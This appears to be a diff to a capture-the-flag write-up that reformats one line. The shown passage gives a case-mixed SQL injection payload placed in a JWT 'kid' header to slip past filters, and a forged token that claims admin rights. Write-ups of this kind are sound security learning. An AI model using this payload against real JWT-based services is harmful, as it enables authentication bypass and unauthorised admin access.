@@ -53,7 +53,10 @@ Thus the key will be forced to be kahla BUT we still get the annoying page "Here
 
 I think there are some filters here :'( Let's try this payload in the kid parameter :
 > 'UNiOn SElEcT 1,'abc' -- -
-The final token used: eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A
+
+The final token used:
+
+eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A
 
 And yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before
 
